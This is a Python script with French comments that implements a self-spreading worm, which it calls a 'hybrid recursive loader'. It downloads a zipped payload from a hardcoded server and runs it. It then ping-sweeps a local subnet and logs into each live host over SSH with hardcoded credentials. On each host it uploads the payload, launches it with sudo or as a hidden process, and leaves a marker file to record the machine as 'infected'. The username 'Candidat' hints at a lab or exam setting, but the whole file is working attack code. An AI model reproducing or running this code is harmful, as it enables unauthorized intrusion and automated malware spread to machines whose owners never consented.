import subprocess
import threading
import ipaddress
from queue import Queue, Empty
import time
import paramiko
import os
import platform
import sys
import requests
import zipfile

# =============================================================================
# CONFIGURATION GÉNÉRALE (SÉCURISÉE & RÉCURSIVE)
# =============================================================================
CONFIG = {
    # --- SECTION RÉSEAU (DISTRIBUTION) ---
    "NETWORK": "192.168.50.0/24", 
    "USERNAME": "Candidat", 
    "PASSWORD": "P@ssw0rd", 
    "BLACKLIST": ["192.168.50.255", "192.168.50.50"], # IPs à ignorer
    
    # Marqueurs pour éviter les boucles infinies de propagation
    "MARKER_LINUX": "/tmp/.sys_updated",
    "MARKER_WIN": "C:/Users/Public/.sys_updated",

    # --- SECTION SERVEUR (LOADER) ---
    "SERVER_IP": "192.168.50.50",
    "SERVER_PORT": "8080",
    "FILE_NAME": "payload.py",
    "EXEC_TARGET": "payload.py",  # Fichier à lancer après extraction
    "EXEC_TYPE": "python",           # "python" ou "direct"
    
    "LINUX":{
	"DEST":"/tmp/payload.py",
	"CMD":"sudo python3 /tmp/payload.py &",
},
    "WINDOWS":{
        "DEST":"C:/Users/Public/payload.py",
        "CMD":'cmd /c start /B pyhtonw "C:/Users/Public/payload.py',
},

    # --- PERFORMANCES ---
    "SCAN_THREADS": 30,
    "DEPLOY_THREADS": 5, # Bas pour ne pas crash le routeur
}
# =============================================================================

COLOR_RESET = "\033[0m"
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_CYAN = "\033[96m"
COLOR_BOLD = "\033[1m"

def print_banner():
    print(COLOR_CYAN + "=" * 65 + COLOR_RESET)
    print(COLOR_CYAN + COLOR_BOLD + "|    HYBRID RECURSIVE LOADER : DOWNLOADER & PROPAGATOR          |" + COLOR_RESET)
    print(COLOR_CYAN + COLOR_BOLD + "|             Système Autonome Multi-OS - Engineering           |" + COLOR_RESET)
    print(COLOR_CYAN + "=" * 65 + COLOR_RESET)

# -----------------------------------------------------------------------------
# PARTIE 1 : LE LOADER (TÉLÉCHARGEMENT ET EXÉCUTION)
# -----------------------------------------------------------------------------

def download_and_execute():
    """Télécharge le payload, l'extrait et l'exécute"""
    url = f"http://{CONFIG['SERVER_IP']}:{CONFIG['SERVER_PORT']}/{CONFIG['FILE_NAME']}"
    save_path = os.path.join(os.path.expanduser("~"), "Downloads", CONFIG["FILE_NAME"])
    extract_path = os.path.join(os.path.expanduser("~"), "Downloads", "payload")

   # print(f"{COLOR_BLUE}[*] Tentative de téléchargement du payload...{COLOR_RESET}")
    try:
        response = requests.get(url, stream=True, timeout=10)
        response.raise_for_status()
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, "wb") as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
       # print(f"{COLOR_GREEN}[+] Payload téléchargé : {save_path}{COLOR_RESET}")
    except Exception as e:
       # print(f"{COLOR_RED}[-] Échec téléchargement : {e}{COLOR_RESET}")
        return False

    try:
        os.makedirs(extract_path, exist_ok=True)
        with zipfile.ZipFile(save_path, "r") as z:
            z.extractall(extract_path)
        #print(f"{COLOR_GREEN}[+] Extraction réussie dans : {extract_path}{COLOR_RESET}")
    except Exception as e:
        #print(f"{COLOR_RED}[-] Échec extraction : {e}{COLOR_RESET}")
        return False

    target_path = os.path.join(extract_path, CONFIG["EXEC_TARGET"])
    if not os.path.exists(target_path):
        #print(f"{COLOR_RED}[-] Fichier cible introuvable : {target_path}{COLOR_RESET}")
        return False

    try:
        if CONFIG["EXEC_TYPE"] == "python":
            subprocess.Popen(["python3" if platform.system().lower() != "windows" else "python", target_path])
        elif CONFIG["EXEC_TYPE"] == "direct":
            if os.name != "nt": os.chmod(target_path, 0o755)
            subprocess.Popen([target_path])
        print(f"{COLOR_GREEN}[+] Payload exécuté avec succès.{COLOR_RESET}")
        return True
    except Exception as e:
       # print(f"{COLOR_RED}[-] Erreur exécution : {e}{COLOR_RESET}")
        return False

# -----------------------------------------------------------------------------
# PARTIE  LE DISTRIBUTEUR (SCAN ET PROPAGATION)
# -----------------------------------------------------------------------------

def is_blacklisted(ip):
    return ip in CONFIG["BLACKLIST"]

def ping_ip(ip_address, active_ips, lock):
    if is_blacklisted(str(ip_address)): return
    try:
        param = "-n" if platform.system().lower() == "windows" else "-c"
        result = subprocess.run(["ping", param, "1", "-w", "1000", str(ip_address)],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        if result.returncode == 0:
            with lock:
                print(f"{COLOR_GREEN}[+] {str(ip_address):<15} ACTIVE{COLOR_RESET}")
                active_ips.append(str(ip_address))
    except Exception: pass

def worker(ip_queue, active_ips, lock):
    while True:
        try:
            ip = ip_queue.get_nowait()
        except Empty: break
        ping_ip(ip, active_ips, lock)
        ip_queue.task_done()

def deploy_recursive(ip):
    """Envoie le payload unique et le lance directement"""
    try:
        print(f"{COLOR_BLUE}[*] Analyse de la machine {ip}...{COLOR_RESET}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=CONFIG["USERNAME"], password=CONFIG["PASSWORD"], timeout=10)

        # 1. Détection OS
        stdin, stdout, stderr = ssh.exec_command("uname")
        os_type = stdout.read().decode().strip()

        marker = None
        os_label = ""
        dest_path = ""
        run_cmd = ""

        if "Linux" in os_type:
            os_label = "DEBIAN"
            marker = CONFIG["MARKER_LINUX"]
            dest_path = "/tmp/" + CONFIG["FILE_NAME"]
            run_cmd = f"sudo python3 {dest_path} &" 
        else:
            stdin, stdout, stderr = ssh.exec_command("ver")
            if stdout.read():
                os_label = "WINDOWS"
                marker = CONFIG["MARKER_WIN"]
                dest_path = "C:/Users/Public/" + CONFIG["FILE_NAME"]
                run_cmd = f'start /B python "{dest_path}"'

        if not marker:
            ssh.close(); return

        # 2. Anti-boucle (Marqueur)
        stdin, stdout, stderr = ssh.exec_command(f"ls {marker}")
        if stdout.channel.recv_exit_status() == 0:
            print(f"{COLOR_YELLOW}[SKIP] {ip} déjà infectée.{COLOR_RESET}")
            ssh.close(); return

        # 3. Transfert direct du fichier unique (Pas de ZIP !)
        sftp = ssh.open_sftp()
        if not os.path.exists(CONFIG["FILE_NAME"]):
            print(f"{COLOR_RED}[!] {CONFIG['FILE_NAME']} manquant localement !{COLOR_RESET}")
            sftp.close(); ssh.close(); return

        sftp.put(CONFIG["FILE_NAME"], dest_path)
        
        # 4. Création marqueur et Lancement
        ssh.exec_command(f"sudo touch {marker}" if os_label == "DEBIAN" else f'echo "inf" > {marker}')
        ssh.exec_command(run_cmd)
        
        print(f"{COLOR_GREEN}[SUCCESS] {ip} infectée avec succès !{COLOR_RESET}")
        sftp.close()
        ssh.close()
    except Exception as e:
        print(f"{COLOR_RED}[FAILED] {ip}: {e}{COLOR_RESET}")

def main():
    print_banner()

    # 1. PROTECTION ANTI-BOUCLE LOCALE
    current_os = platform.system().lower()
    local_marker = CONFIG["MARKER_WIN"] if current_os == "windows" else CONFIG["MARKER_LINUX"]
    if os.path.exists(local_marker):
        print(f"{COLOR_RED}L'agent est déjà présent ici. Fin du cycle.{COLOR_RESET}")
        return
    try:
        with open(local_marker, "w") as f: f.write("done")
    except: pass

    # 2. PHASE LOADER (L'action immédiate sur la machine)
    print(f"{COLOR_YELLOW} Phase 1 : Exécution du Loader...{COLOR_RESET}")
    download_and_execute()

    # 3. PHASE DISTRIBUTION (La propagation récursive)
    print(f"\n{COLOR_BLUE} Phase 2 : Propagation au réseau {CONFIG['NETWORK']}...{COLOR_RESET}")
    try:
        network = ipaddress.ip_network(CONFIG["NETWORK"], strict=False)
        ips_to_scan = list(network.hosts()) if network.num_addresses > 2 else list(network)
    except ValueError as e:
        print(f"{COLOR_RED}Erreur réseau: {e}{COLOR_RESET}")
        return

    ip_queue = Queue()
    for ip in ips_to_scan: ip_queue.put(ip)

    active_ips = []
    lock = threading.Lock()
    
    scan_threads = []
    num_scan_threads = min(CONFIG["SCAN_THREADS"], len(ips_to_scan))
    for _ in range(num_scan_threads):
        t = threading.Thread(target=worker, args=(ip_queue, active_ips, lock))
        t.daemon = True
        t.start()
        scan_threads.append(t)

    ip_queue.join()

    # Déploiement récursif
    deploy_threads = []
    for ip in active_ips:
        t = threading.Thread(target=deploy_recursive, args=(ip,))
        t.start()
        deploy_threads.append(t)
        if len(deploy_threads) >= CONFIG["DEPLOY_THREADS"]:
            for dt in deploy_threads: dt.join()
            deploy_threads = []

    for t in deploy_threads: t.join()
    print(f"\n{COLOR_GREEN} Cycle terminé. Le payload a été distribué et lancé.{COLOR_RESET}")

if __name__ == "__main__":
    main()
